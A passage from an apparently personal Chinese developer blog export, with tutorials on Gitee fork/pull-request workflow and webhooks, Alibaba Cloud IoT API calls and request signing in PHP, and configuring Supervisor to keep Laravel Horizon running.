![image-20200914182754870](/images/imgs/gitee/image-20200914182754870.png)

![image-20200914182842254](/images/imgs/gitee/image-20200914182842254.png)

### 2.检查分支代码

**注意**:  若 `origin/dev` 分支与 `resource/dev `分支提交记录不在同一条, 如下所示:

​		需要 **拉取最新源仓库代码** 后开始开发

![image-20200914183552091](/images/imgs/gitee/image-20200914183552091.png)

- 获取最新提交记录

  > 等同于`git fetch --all`

  ![image-20200914184401421](/images/imgs/gitee/image-20200914184401421.png)

- 确认当前所在本地分支为想要拉取同步的分支, 右键点击`resource/dev`所在提交, 合并到同名本地分支`dev`

  > 等同于`git checkout dev`  +  `git merge resource/dev` 

  ![image-20200914183703744](/images/imgs/gitee/image-20200914183703744.png)

- 点击确定

  ![image-20200914184448309](/images/imgs/gitee/image-20200914184448309.png)

- 合并完成后点击推送到拷贝仓库`origin/dev` 

  > 注意: 如果提示冲突, 请手动处理冲突后提交至拷贝仓库 `origin` 3.

  ![image-20200914184540196](/images/imgs/gitee/image-20200914184540196.png)

### 3.代码书写

​	......

### 4.提交代码

![image-20200915112403299](/images/imgs/gitee/image-20200915112403299.png)

### 5.检查书写代码期间是否有相关提交

#### - 拉取最新提交

![image-20200915112545436](/images/imgs/gitee/image-20200915112545436.png)

#### - 查看源仓库分支变动

![image-20200915112739052](/images/imgs/gitee/image-20200915112739052.png)

#### -  合并源仓库分支代码到拷贝仓库分支

![image-20200915113030531](/images/imgs/gitee/image-20200915113030531.png)

#### - 若有冲突, 处理冲突

![image-20200915113125306](/images/imgs/gitee/image-20200915113125306.png)

- 查看冲突所在文件

  ![image-20200915113154978](/images/imgs/gitee/image-20200915113154978.png)

- 处理冲突

- 提交代码

  ![image-20200915113918846](/images/imgs/gitee/image-20200915113918846.png)

### 6.提交PR(Pull Request)

#### - 点击远端,进入项目所在网页

![image-20200915114051027](/images/imgs/gitee/image-20200915114051027.png)

#### - 点击新建PR

![image-20200915114144211](/images/imgs/gitee/image-20200915114144211.png)

#### - 创建PR

![image-20200915121855780](/images/imgs/gitee/image-20200915121855780.png)

#### - 完成提交, 等待管理员审核通过合并

![image-20200915122011108](/images/imgs/gitee/image-20200915122011108.png)

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>码云 PR提交关联任务+Hook提醒</title>
    <url>/2020/10/23/Gitee%20PR%E6%8F%90%E4%BA%A4%E5%85%B3%E8%81%94%E4%BB%BB%E5%8A%A1+Hook%E6%8F%90%E9%86%92/</url>
    <content><![CDATA[
## WebHook实现

### 企业微信端设置:

#### 1.创建企业微信群聊

#### 2.创建自定义机器人

> 需要配置企业后台开启机器人功能

![image-20200917134658399](/images/imgs/gitee/image-20200917134658399.png)

3.获取机器人 `WebHook 地址`

![image-20200917134711636](/images/imgs/gitee/image-20200917134711636.png)

### Gitee仓库设置:

#### 1.打开项目网址, 进入管理选项卡

#### 2.选择WebHooks, 点击添加

![image-20200917134819489](/images/imgs/gitee/image-20200917134819489.png)

#### 3.填写配置信息

- 将机器人WebHook地址填入**URL** 

-  **WebHook 密码/签名密钥** 选择密码, 置空

  > 企业微信未提供秘钥, 钉钉需要勾选签名秘钥并填写

- 勾选需要触发通知的条件

  ![image-20200917134934255](/images/imgs/gitee/image-20200917134934255.png)

#### 4.点击添加

添加完成后, 将自动发送一条企业微信机器人通知, 如下

![image-20200917135104778](/images/imgs/gitee/image-20200917135104778.png)

## PR提交关联任务

具体操作为在提交时, 书写`link #ID`, 即可将任务关联到PR提交

![image-20200917135557587](/images/imgs/gitee/image-20200917135557587.png)

注意: 完成提交, 将PR合并后将自动关闭`Issue` 

## PR提交配置模板

在项目文件中新建文件

`.gitee/PULL_REQUEST_TEMPLATE.zh-CN.md`

内容实例为:

> markdown 书写方式, 可自定义

```
### 相关的Issue


### 原因（目的、解决的问题等）


### 描述（做了什么，变更了什么）


### 测试用例（新增、改动、可能影响的功能）
```

提交后(最好在master分支), 后面的PR提交会显示模板内容

![image-20200917145343046](/images/imgs/gitee/image-20200917145343046.png)

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>码云 fork+pr操作教程</title>
    <url>/2020/10/25/Gitee%20%E7%A0%81%E4%BA%91fork+pr%E6%93%8D%E4%BD%9C%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[
#  pull request 操作

## 一.单账号Fork_PR操作

### 1.准备账号:

主账号:   Mr.NI9NE_`ni9ne@outook.com`   

副账号1: Mr.zlb1_ `940223345@qq.com`      副账号2:   Mr.ZLB2_ `488747128@qq.com`    

### 2.主账号建立私有仓库:

![1600050343620](/images/imgs/gitee/1600050343620.png) 



### 3.副账号1Fork该仓库

#### - 添加该账号到项目

![1600051268581](/images/imgs/gitee/1600051268581.png)

#### - Fork仓库到自己的项目中

![1600051387661](/images/imgs/gitee/1600051387661.png)

![1600051479417](/images/imgs/gitee/1600051479417.png)

### 4.副账号1克隆自己的项目到本地开发

![1600051676792](/images/imgs/gitee/1600051676792.png)

### 5.开发功能完成, 推送到本账号项目分支

![1600053781089](/images/imgs/gitee/1600053781089.png)

### 6.进入项目Gitee页面, 创建Pull Request

#### - 点击新建Pull Request

![1600053940805](/images/imgs/gitee/1600053940805.png)

#### - 选择本地项目分支 和 目标项目分支

![1600054310266](/images/imgs/gitee/1600054310266.png)

#### - 填写Pull Request 详情, 选择审核/测试负责人

![1600054321207](/images/imgs/gitee/1600054321207.png)

> 当前显示可自动合并即可, 否则需要自行处理冲突



### 7.管理员查看, 测试, 合并到主项目分支

#### - 查看Pull Request

![1600054512665](/images/imgs/gitee/1600054512665.png)

#### - 审查代码,测试代码

![1600062213525](/images/imgs/gitee/1600062213525.png)

#### - 确认合并

![1600062395922](/images/imgs/gitee/1600062395922.png)

### 8.查看合并结果

![1600062711861](/images/imgs/gitee/1600062711861.png)

## 二.多账号Fork_PR操作

### 1.副账号2Fork仓库

### 2.副账号2Clone仓库

![1600063510303](/images/imgs/gitee/1600063510303.png)

### 3.基于master分支创建新特性分支Feature2

![1600064116925](/images/imgs/gitee/1600064116925.png)

### 4.开发功能, 提交分支

> 功能代码与其他无冲突

![1600064152851](/images/imgs/gitee/1600064152851.png)

![1600064173030](/images/imgs/gitee/1600064173030.png)

### 5.创建Pull Request

#### - 新建Pull Request

![1600064276903](/images/imgs/gitee/1600064276903.png)

#### - 选择提交分支, 提交目标分支

![1600064495182](/images/imgs/gitee/1600064495182.png)

#### - 查看提交, 并自测

> 有显示是否可以自动合并, 说明提交代码没有冲突

![1600064530725](/images/imgs/gitee/1600064530725.png)

### 6.切换主账号查看Pull Request

![1600064811716](/images/imgs/gitee/1600064811716.png)

### 7.确认代码符合条件, 合并至分支

![1600064886860](/images/imgs/gitee/1600064886860.png)

![1600064981103](/images/imgs/gitee/1600064981103.png)

### 8.查看主项目合并状况

![1600065480982](/images/imgs/gitee/1600065480982.png)

## 三.副账号查看源仓库变动(最新)代码

### 1.添加 remote 关联

 `git remote add resource https://gitee.com/NI9NE/laravel_permission_test.git` 

![1600065554478](/images/imgs/gitee/1600065554478.png)

### 2.查看关联情况

`git remote -v` 

### 3.拉取源仓库更新

`git fetch --all   /  git fetch resource ` 

### 4.合并到本地分支

`git merge resource/dev` 

### 5.推送变更到本地对应远程origin仓库

 `git push origin dev` 

![1600066019005](/images/imgs/gitee/1600066019005.png)

### 6.查看项目合并拉取状况

![1600067187887](/images/imgs/gitee/1600067187887.png)

## 四.多账号冲突Fork_PR操作

### 1.同步账号1和账号2所在源项目分支代码

### 2.副账号2先修改提交

#### - 删除+新增 代码

![1600067406076](/images/imgs/gitee/1600067406076.png)

#### - 审核/合并代码,拉取最新代码

![1600068317627](/images/imgs/gitee/1600068317627.png)

### 3.副账号1同时修改该文件

![1600068550112](/images/imgs/gitee/1600068550112.png)

####  - 提交Pull Request

![1600068867942](/images/imgs/gitee/1600068867942.png)

#### -  暂缓提交, 拉取最新代码, 查看冲突

![1600069183412](/images/imgs/gitee/1600069183412.png)

![1600069033120](/images/imgs/gitee/1600069033120.png)

#### - 处理冲突

![1600069530351](/images/imgs/gitee/1600069530351.png)

#### -  冲突处理完毕, 重新发起PR

![1600069597014](/images/imgs/gitee/1600069597014.png)

### 4.主账号审核/合并分支

![1600069801114](/images/imgs/gitee/1600069801114.png)

#### - 查看合并状态

![1600069780593](/images/imgs/gitee/1600069780593.png)

```
git:https://gitee.com
488747128@qq.com
940223345@qq.com
ni9ne@outlook.com
```


]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT物联网接入</title>
    <url>/2020/11/27/IoT%E7%89%A9%E8%81%94%E7%BD%91%E6%8E%A5%E5%85%A5/</url>
    <content><![CDATA[
## 阿里云平台功能页面

### 1.设备生命周期

设备注册、功能定义、数据解析、在线调试、远程配置、固件升级、远程维护、实时监控、分组管理、设备删除

### 2.[阿里云平台API列表](https://help.aliyun.com/document_detail/69893.html?spm=a2c4g.11186623.6.737.7fb77d9eYGo3Jd) 

![1589334935827](/images/imgs/Iot/1589334935827.png)

#### 2.1 [API调用详情页](https://help.aliyun.com/document_detail/69123.html?spm=a2c4g.11186623.2.16.496931123iaPXc#reference-mjn-n5l-vdb) ![1589335056739](assets/1589335056739.png)

#### 2.2 [ OpenAPI Explorer(开放平台接口)](https://api.aliyun.com/#/?product=Iot&api=CreateProduct&params={}&tab=DEMO&lang=PHP) 

![1589335226192](/images/imgs/Iot/1589335226192.png)



## 测试产品生命周期调用接口测试

### 1.注册产品

```
CreateProduct-调用该接口新建产品。
$result = AlibabaCloud::rpc()
                          ->product('Iot')
                          // ->scheme('https') // https | http
                          ->version('2018-01-20')
                          ->action('CreateProduct')
                          ->method('POST')
                          ->host('iot.cn-shanghai.aliyuncs.com')
                          ->options([
                                        'query' => [
                                          'RegionId' => "cn-shanghai",
                                          'NodeType' => "0",
                                          'ProductName' => "测试设备",
                                          'Description' => "测试设备描述信息",
                                        ],
                                    ])
                          ->request();
    print_r($result->toArray());
```

```
返回数据
{
	"RequestId": "EF546A4E-BC53-43C6-AA00-41FBC945B2C8",
	"Data": {
		"Description": "测试设备描述信息",
		"ProductName": "测试设备",
		"AliyunCommodityCode": "iothub",
		"NodeType": 0,
		"ProductKey": "a1WWzwKZcvd"
	},
	"Code": "",
	"Success": true,
	"ProductKey": "a1WWzwKZcvd"
}
```

### 2.注册设备

```
RegisterDevice-调用该接口在指定产品下注册设备。

$result = AlibabaCloud::rpc()
                          ->product('Iot')
                          // ->scheme('https') // https | http
                          ->version('2018-01-20')
                          ->action('RegisterDevice')
                          ->method('POST')
                          ->host('iot.cn-shanghai.aliyuncs.com')
                          ->options([
                                        'query' => [
                                          'RegionId' => "cn-shanghai",
                                          'ProductKey' => "a1WWzwKZcvd",
                                          'Nickname' => "这是备注名",
                                        ],
                                    ])
                          ->request();
    print_r($result->toArray());
```

```
返回数据-自动生成
{
	"RequestId": "8B4CC93D-A515-4469-B054-323DCA1BF913",
	"Data": {
		"IotId": "8B8MvTIuD8qgAz8Q6jhW000000",   #设备的唯一标识符
		"DeviceSecret": "npjzVfRuA6WSG9PrGNPaKEIXTMa8Dv0v",  #设备密钥
		"ProductKey": "a1WWzwKZcvd",  #所属产品
		"JoinEui": "",
		"DeviceName": "8B8MvTIuD8qgAz8Q6jhW",  #设备名称
		"Nickname": "这是备注名"
	},
	"Code": "",
	"Success": true
}
```

### 3.启用设备

```
EnableThing-调用该接口解除指定设备的禁用状态，即启用被禁用的设备。

    $result = AlibabaCloud::rpc()
                          ->product('Iot')
                          // ->scheme('https') // https | http
                          ->version('2018-01-20')
                          ->action('EnableThing')
                          ->method('POST')
                          ->host('iot.cn-shanghai.aliyuncs.com')
                          ->options([
                                        'query' => [
                                          'RegionId' => "cn-shanghai",
                                          'ProductKey' => "a1WWzwKZcvd",
                                          'DeviceName' => "8B8MvTIuD8qgAz8Q6jhW",
                                        ],
                                    ])
                          ->request();
    print_r($result->toArray());
```

```
返回数据-成功/失败
{
	"RequestId": "95094861-499A-48BC-A000-601CDA4E7116",
	"Code": "",
	"Success": true
}
```

>  显示设备未激活(需要绑定真实的设备)

![1589337285038](/images/imgs/Iot/1589337285038.png)

### 4.查询设备状态

```
GetDeviceStatus-查看指定设备的运行状态。
	$result = AlibabaCloud::rpc()
                          ->product('Iot')
                          // ->scheme('https') // https | http
                          ->version('2018-01-20')
                          ->action('GetDeviceStatus')
                          ->method('POST')
                          ->host('iot.cn-shanghai.aliyuncs.com')
                          ->options([
                                        'query' => [
                                          'RegionId' => "cn-shanghai",
                                          'ProductKey' => "a1WWzwKZcvd",
                                          'DeviceName' => "8B8MvTIuD8qgAz8Q6jhW",
                                        ],
                                    ])
                          ->request();
    print_r($result->toArray());
```

```
返回数据
{
	"RequestId": "D1510E6D-D871-4E5C-9C99-22B8F501E104",
	"Data": {
		"Status": "UNACTIVE"  #未激活
	},
	"Code": "",
	"Success": true
}
```

### 5.创建本地模拟设备(nodejs)

>  每5秒发送温度+湿度随机参数

![1589435890759](/images/imgs/Iot/1589435890759.png)

![1589435938715](/images/imgs/Iot/1589435938715.png) 

### 6.创建物模型

```
CreateThingModel-为指定产品的物模型新增功能
    "productKey": "a1WWzwKZcvd",
    "properties": [
        {
            "productKey": "a1WWzwKZcvd",
            "identifier": "temperature",
            "dataType": {
		        "type": "double",
		        "specs": {
		          "min": "0",
		          "max": "100",
		          "unit": "%",
		          "unitName": "百分比",
		          "step": "0.01"
		        }
      		}
            "name": "温度",
            "rwFlag": "READ_WRITE"
        }
    ],
    "services": [],
    "events": []
}
```

```
返回数据
{
  "RequestId": "9E76053E-26ED-4AB4-AE58-8AFC3F1E7E8E",
  "Success": true
}
```

### 7.显示设备即时数据

![1589443197759](/images/imgs/Iot/1589443197759.png)

![1589443989620](/images/imgs/Iot/1589443989620.png)



## 调用API请求结构

### 1.请求结构

#### 1.接口

```
http://Endpoint/?Action=xx&Parameters
```

> 可发送HTTP/HTTPS请求

#### 2.参数

| 参数       | 说明                                                         |
| ---------- | ------------------------------------------------------------ |
| Endpoint   | 调用云服务的接入地址。物联网平台的接入地址格式：`iot.${RegionId}.aliyuncs.com`。其中，变量${RegionId}需替换为您的物联网平台服务的地域代码。<br />例如: 华东2（上海）：`iot.cn-shanghai.aliyuncs.com` |
| Action     | 要执行的操作，即云端API接口的名称。例如，调用Pub接口向指定Topic发布消息，**Action**对应的值就是Pub，即`Action=Pub`。 |
| Parameters | 请求参数。每个参数之间用（&）符号分隔。<br />请求参数由[公共请求参数](https://help.aliyun.com/document_detail/30561.html#reference-tjr-twc-xdb)和API自定义参数组成。公共参数中包含API版本号、身份验证等信息。 |

公共请求参数如下:

> 公共请求参数是调用每个API时都需要使用的请求参数。

| 名称             | 类型   | 是否必需 | 描述                                                         |
| :--------------- | :----- | :------- | :----------------------------------------------------------- |
| Format           | String | 否       | 返回值的类型，支持JSON和XML类型。默认为XML。                 |
| Version          | String | 是       | API版本号，为日期形式：`YYYY-MM-DD`，最新版本为`2018-01-20` 。每个接口可以存在多个版本。 |
| AccessKeyId      | String | 是       | 阿里云颁发给用户的访问服务所用的密钥ID。登录阿里云控制台，将光标移至账号头像上，然后单击**accesskeys**，跳转至**用户信息管理**页，即可创建和查看AccessKey。 |
| Signature        | String | 是       | 签名结果串。                                                 |
| SignatureMethod  | String | 是       | 签名方式，目前支持HMAC-SHA1。                                |
| Timestamp        | String | 是       | 请求的时间戳。日期格式按照ISO8601标准表示，并需要使用UTC时间。格式为`YYYY-MM-DDThh:mm:ssZ`。例如，`2016-01-04T12:00:00Z`表示北京时间2016年01月04日20点0分0秒。 |
| SignatureVersion | String | 是       | 签名算法版本。目前版本是1.0。                                |
| SignatureNonce   | String | 是       | 唯一随机数。用于防止网络重放攻击。用户在不同请求中要使用不同的随机数值。 |
| RegionId         | String | 是       | 设备所在地域（与控制台上的地域对应），如cn-shanghai。        |

#### 3.案例

> 调用Pub接口向指定Topic发布消息

```
https://iot.cn-shanghai.aliyuncs.com/?Action=Pub
&Format=XML
&Version=2017-04-20
&Signature=Pc5WB8gokVn0xfeu%2FZV%2BiNM1dgI%3D
&SignatureMethod=HMAC-SHA1
&SignatureNonce=15215528852396
&SignatureVersion=1.0
&AccessKeyId=...
&Timestamp=2017-07-19T12:00:00Z
&RegionId=cn-shanghai
...
```

#### 4.返回参数

- 成功:

  - XML格式

    ```
    <?xml version="1.0" encoding="UTF-8"?> 
    <!—结果的根结点-->
    <接口名称+Response>
        <!—返回请求标签-->
        <RequestId>4C467B38-3910-447D-87BC-AC049166F216</RequestId>
        <!—返回结果数据-->
    </接口名称+Response>
    ```

  - JSON格式

    ```
    {
        "RequestId": "4C467B38-3910-447D-87BC-AC049166F216"
        /* 返回结果数据 */
    }
    ```

- 失败

  - XML格式

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <Error>
       <RequestId>8906582E-6722-409A-A6C4-0E7863B733A5</RequestId>
       <Code>UnsupportedOperation</Code>
       <Message>The specified action is not supported.</Message>
    </Error>
    ```

  - JSON格式

    ```
    {
        "RequestId": "8906582E-6722-409A-A6C4-0E7863B733A5",
        "Code": "UnsupportedOperation",
        "Message": "The specified action is not supported."
    }
    ```

>  注意:  需要**授权调用**的接口的**Action参数**由原来的 `操作名`变为`iot:操作名`

### 2.签名机制

物联网平台会对每个接口访问请求的发送者进行身份验证，所以无论使用HTTP还是HTTPS协议提交请求，都需要在请求中包含签名（Signature）信息。

#### 签名方法

签名时，您需在控制台 [AccessKey 管理](https://usercenter.console.aliyun.com/#/manage/ak)页面查看您的账号的AccessKeyId和AccessKeySecret，然后进行对称加密。其中，AccessKeyId用于标识访问者身份；AccessKeySecret是用于加密签名字符串和服务器端验证签名字符串的密钥，必须严格保密。

#### 签名示例

以调用Pub接口为例。假设您的`AccessKeyId=testid`，`AccessKeySecret=testsecret`。

1. 组成签名前的请求URL。

   ```
   http://iot.cn-shanghai.aliyuncs.com/?MessageContent=aGVsbG93b3JsZA%3D&Action=Pub&Timestamp=2017-10-02T09%3A39%3A41Z&SignatureVersion=1.0&ServiceCode=iot&Format=XML&Qos=0&SignatureNonce=0715a395-aedf-4a41-bab7-746b43d38d88&Version=2017-04-20&AccessKeyId=testid&SignatureMethod=HMAC-SHA1&RegionId=cn-shanghai&ProductKey=12345abcdeZ&TopicFullName=%2FproductKey%2Ftestdevice%2Fget
   ```

2. 计算得到待签名字符串

   StringToSign

   ```
   GET&%2F&AccessKeyId%3Dtestid%26Action%3DPub%26Format%3DXML%26MessageContent%3DaGVsbG93b3JsZA%253D%26ProductKey%3D12345abcdeZ%26Qos%3D0%26RegionId%3Dcn-shanghai%26ServiceCode%3Diot%26SignatureMethod%3DHMAC-SHA1%26SignatureNonce%3D0715a395-aedf-4a41-bab7-746b43d38d88%26SignatureVersion%3D1.0%26Timestamp%3D2017-10-02T09%253A39%253A41Z%26TopicFullName%3D%252FproductKey%252Ftestdevice%252Fget%26Version%3D2017-04-20
   ```

3. 计算签名值。

   因为`AccessKeySecret=testsecret`，用于计算的Key为testsecret&，计算得到的签名值为：

   ```
   Y9eWn4nF8QPh3c4zAFkM/k/u7eA=
   ```

4. 将签名作为

   `Signature`参数加入到URL请求中，最后得到的URL为：

   ```
   http://iot.cn-shanghai.aliyuncs.com/?MessageContent=aGVsbG93b3JsZA%3D
   &Action=Pub
   &Timestamp=2017-10-02T09%3A39%3A41Z
   &SignatureVersion=1.0
   &ServiceCode=iot
   &Format=XML
   &Qos=0
   &SignatureNonce=0715a395-aedf-4a41-bab7-746b43d38d88
   &Version=2017-04-20
   &AccessKeyId=testid
   &Signature=Y9eWn4nF8QPh3c4zAFkM%2Fk%2Fu7eA%3D
   &SignatureMethod=HMAC-SHA1
   &RegionId=cn-shanghai
   &ProductKey=12345abcdeZ
   &TopicFullName=%2FproductKey%2Ftestdevice%2Fget
   ```



## 企业基于物联网平台的业务链路

![企业基于物联网平台的业务链路](https://static-aliyun-doc.oss-cn-hangzhou.aliyuncs.com/assets/img/zh-CN/3621418851/p101379.png)

## 产品名词解释

| 名词          | 描述                                                         |
| :------------ | :----------------------------------------------------------- |
| 产品          | 设备的集合，通常指一组具有相同功能的设备。物联网平台为每个产品颁发全局唯一的ProductKey。每个产品下最多可以包含50万个设备。 |
| 设备          | 归属于某个产品下的具体设备。物联网平台为设备颁发产品内唯一的证书DeviceName。设备可以直接连接物联网平台，也可以作为子设备通过网关连接物联网平台。 |
| 分组          | 物联网平台支持建立设备分组，分组中可包含不同产品下的设备。通过设备组来进行跨产品管理设备。 |
| 网关          | 能够直接连接物联网平台的设备，且具有子设备管理功能，能够代理子设备连接云端。 |
| 子设备        | 本质上也是设备。子设备不能直接连接物联网平台，只能通过网关连接。 |
| 设备证书      | 设备证书指**ProductKey**、**DeviceName**、**DeviceSecret**。**ProductKey**：是物联网平台为产品颁发的全局唯一标识。该参数很重要，在设备认证以及通信中都会用到，因此需要您保管好。**DeviceName**：在注册设备时，自定义的或系统生成的设备名称，具备产品维度内的唯一性。该参数很重要，在设备认证以及通信中都会用到，因此需要您保管好。**DeviceSecret**：物联网平台为设备颁发的设备密钥，和DeviceName成对出现。该参数很重要，在设备认证时会用到，因此需要您保管好并且不能泄露。 |
| ProductSecret | 由物联网平台颁发的产品密钥，通常与ProductKey成对出现，可用于一型一密的认证方案。该参数很重要，需要您保管好，不能泄露。 |
| 设备X.509证书 | 物联网平台支持设备使用X.509数字证书进行身份验证。您创建认证方式为X.509证书的设备后，物联网平台为设备颁发对应的X.509证书，证书信息包括：X.509数字证书（**Certificate**）、X.509证书ID（**CertSN**）和X.509证书密钥（**PrivateKey**）。 |
| Topic         | Topic是UTF-8字符串，是发布（Pub）/订阅（Sub）消息的传输中介。可以向Topic发布或者订阅消息。 |
| Topic类       | 同一产品下不同设备的Topic集合，用`${productkey}`和`${deviceName}`通配一个唯一的设备，一个Topic类对一个ProductKey下所有设备通用。 |
| 发布          | 操作Topic的权限类型，对应的英文名称为Pub。可以往此类Topic中发布消息。 |
| 订阅          | 操作Topic的权限类型，对应的英文名称为Sub。可以从此类Topic中订阅消息。 |
| RRPC          | 全称：Revert-RPC。RPC（Remote Procedure Call）采用客户机/服务器模式，用户不需要了解底层技术协议，即可远程请求服务。RRPC则可以实现由服务端请求设备端，并能够使设备端响应的功能。 |
| 标签          | 标签分为产品标签、设备标签和分组标签。产品标签：描述同一个产品下，所有设备所具有的共性信息。设备标签：通常根据设备的特性为设备添加的特有标记，您可以自定义标签内容。分组标签：描述同一个分组下，所有设备所具有的共性信息。 |
| Alink协议     | 阿里云定义的设备与云端之间的通信协议。                       |
| 物模型        | 是对设备在云端的功能描述，包括设备的属性、服务和事件。物联网平台通过定义一种物的描述语言来描述物模型，称之为 TSL（即 Thing Specification Language），采用JSON格式，您可以根据TSL组装上报设备的数据。 |
| 属性          | 设备的功能模型之一，一般用于描述设备运行时的状态，如环境监测设备所读取的当前环境温度等。属性支持 GET 和 SET 请求方式。应用系统可发起对属性的读取和设置请求。 |
| 服务          | 设备的功能模型之一，设备可被外部调用的能力或方法，可设置输入参数和输出参数。相比于属性，服务可通过一条指令实现更复杂的业务逻辑，如执行某项特定的任务。 |
| 事件          | 设备的功能模型之一，设备运行时的事件。事件一般包含需要被外部感知和处理的通知信息，可包含多个输出参数。例如，某项任务完成的信息，或者设备发生故障或告警时的温度等，事件可以被订阅和推送。 |
| 数据解析脚本  | 针对采用透传格式/自定义数据格式的设备，需要在云端编写数据解析脚本，将设备上报的二进制数据或自定义的JSON数据，转换为物联网平台支持的Alink JSON数据格式；将平台下发的Alink JSON格式数据，转换为设备支持的格式。 |
| 设备影子      | 是一个JSON文档，用于存储设备或者应用的当前状态信息。每个设备都会在云端有唯一的设备影子。无论该设备是否连接到Internet，您都可以使用设备影子通过MQTT协议或HTTP协议获取和设置设备的状态。 |
| 规则引擎      | 通过创建、配置规则，以实现数据流转和场景联动。               |
| 数据流转      | 物联网平台规则引擎的数据流转功能，可将Topic中的数据转发至其他Topic或其他阿里云服务进行存储或处理。 |
| 场景联动      | 场景联动是一种开发自动化业务逻辑的可视化编程方式。您可以通过可视化的方式定义设备之间联动规则，并将规则部署至云端或者边缘端。 |
| 服务端订阅    | 服务端订阅产品下所有类型的消息：设备上报消息、设备状态变化通知、网关发现子设备上报消息、设备生命周期变更消息和设备拓扑关系变更消息。目前支持两种方式实现服务端订阅：AMQP：Advanced Message Queuing Protocol即高级消息队列协议。服务端通过AMQP协议接入云端，接收云端推送的消息。MNS：将消息流转到指定MNS队列中，您的服务端从MNS队列中接收消息。 |
| 一型一密      | 同一产品下所有设备可以烧录相同产品证书（即ProductKey和ProductSecret）。设备发送激活请求时，物联网平台进行产品身份确认，认证通过，下发该设备对应的DeviceSecret。 |
| 一机一密      | 每个设备烧录其唯一的设备证书（ProductKey、DeviceName和DeviceSecret）。当设备与物联网平台建立连接时，物联网平台对其携带的设备证书信息进行认证。 |
| 期望属性值    | 通过期望属性值功能，设置您希望的设备属性值。若设备在线，将实时更新属性值；若设备离线，期望属性值将缓存在云端。设备上线后，获取期望属性值，并更新属性值。 |
| 公共实例      | 在阿里云官网线上开通的物联网平台服务为公共实例。公共实例部署于阿里云经典网络。多账号共用一个公共实例，账号之间逻辑隔离。产品、设备、规则等资源可在[阿里云物联网平台控制台](https://iot.console.aliyun.com/product/region/cn-shanghai)上进行操作管理。 |
| 独享实例      | 部署于阿里云VPC网络的物联网平台独享实例。一个账号独享一个实例资源。独享实例适用于设备数量达10万及以上的客户、资源隔离性要求高的行业客户或物联网平台转售商等。购买独享实例，请联系阿里云商务人员（电话：95187转1）或[提交工单](https://selfservice.console.aliyun.com/ticket/createIndex)。 |

## API列表

`https://help.aliyun.com/document_detail/69893.html` 

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Iot</tag>
      </tags>
  </entry>
  <entry>
    <title>Supervisor线上进程监护工具配置</title>
    <url>/2020/01/19/Supervisor%E7%BA%BF%E4%B8%8A%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8A%A4%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[
# Supervisor 使用总结

**Supervisor 是一个进程监护工具，在 Laravel 中，我们用来监护消息队列、Horizon 进程，以便在其意外退出时自动重启。**

Ubuntu 环境下，运行：`apt-get install -y supervisor`。

安装完毕后，配置文件位于：`/etc/supervior`，在该文件夹下，有

```
conf.d  # 自定义配置文件存放目录
supervisord.conf # 主配置文件，自定义文件会在这里include进来
```

为了监护 Horizon 进程，我们在 conf.d 文件夹下创建一份配置，文件名随意，各项作用见注释：

```
[program:laravel_horizon]    ;监护程序名称，随意起，但不能跟其他的重复
process_name=%(program_name)s_%(process_num)02d    ;进程名称
directory=/var/www/html/larabbs    ;命令运行的目录
command=php artisan horizon    ;要执行的命令
autostart=true    ;当supervisor启动时,程序自动启动
autorestart=true    ;自动重启
numprocs=1    ; 进程数
user=root     ;执行命令的账号
stopasgroup=true    ;这个和下面一个配置可以防止监护的进程意外重启后子进程残留
killasgroup=true
redirect_stderr=true    ;这里设为true，就可以配置下面的目录
stdout_logfile=/var/www/html/larabbs/storage/laravel_horizon.log    ;日志目录
```

## 使用

运行 `supervisord -c /etc/supervisor/supervisord.conf` 启动，启动后就可以使用 `supervisorctl` 命令来进行一些进程管理操作，比如：

```
supervisorctl status # 查看状态

 # 以下针对laravel_horizon:laravel_horizon_00进程操作：
 supervisorctl stop laravel_horizon:laravel_horizon_00 
 supervisorctl start laravel_horizon:laravel_horizon_00
 supervisorctl restart laravel_horizon:laravel_horizon_00
 

supervisorctl shutdown  # 关闭supervisor

supervisorctl reread
supervisorctl update   配置文件修改后可以使用该命令加载新的配置
supervisorctl start mch-register:*
supervisorctl start mch-project:*
supervisorctl start mch-settled:*
supervisorctl help：帮助命令
supervisorctl reload： 重新启动配置中的所有程序

sudo supervisorctl stop all 停止所有进程
```

> 如果 supervisor 成功启动，在日志文件中可以看到：`Horizon started successfully.`，当有队列被执行了，日志中可以看到信息，比如：

```
[2019-11-19 14:27:30][8] Processing: App\Jobs\TranslateSlug
[2019-11-19 14:27:30][8] Processed:  App\Jobs\TranslateSlug
```

## 遇到的问题

- 启动时报错，找不到 unix:///var/run/supervisor.sock

  解决：Linux 命令中断依次运行以下命令：

  ```php
  touch /var/run/supervisor.sock
  chmod 777 /var/run/supervisor.sock
  ```

- 启动时报错：Unlinking stale socket /var/run/supervisor.sock

  解决：运行：`unlink /var/run/supervisor.sock`

- supervisor: couldn't chdir to /var/html/www/larabbs: ENOENT
  supervisor: child process was not spawned

  解决：directory 目录路径写错了，调整回正确路径

- `no such file or directory line224`

  ```undefined
  启动服务
  systemctl start supervisord
  再继续执行 supervisorctl reread
  ```

- 跨库插入失败, 实际上插入成功, 出现失败记录, 导致一直尝试重复插入

  尝试1: 将t_job/t_failed_job 均改为v_t_job/ v_t_failed_job 同库查询操作

- **如果遇到 Failed to cache access token 的问题，一般有两种可能**

  ------

  第一种情况，你可能使用的是 overtrue/wechat 4.1.16 版本，因为作者的大意引发的BUG，作者紧接着在4.1.17就修复了，更新新版就可以了。

  第二种情况就是

  问题的源起是我修改了php-fpm的运行用户，处理完一些常见的目录权限之后，报了Failed to cache access token 这个错误，于是我去 overtrue/wechat/src/Kernel/AccessToken.php:141 看了下源码，发现是因为token缓存文件没写成功。

  然后在文档( [缓存](https://www.easywechat.com/docs/master/customize/cache) )中找到了缓存方式。
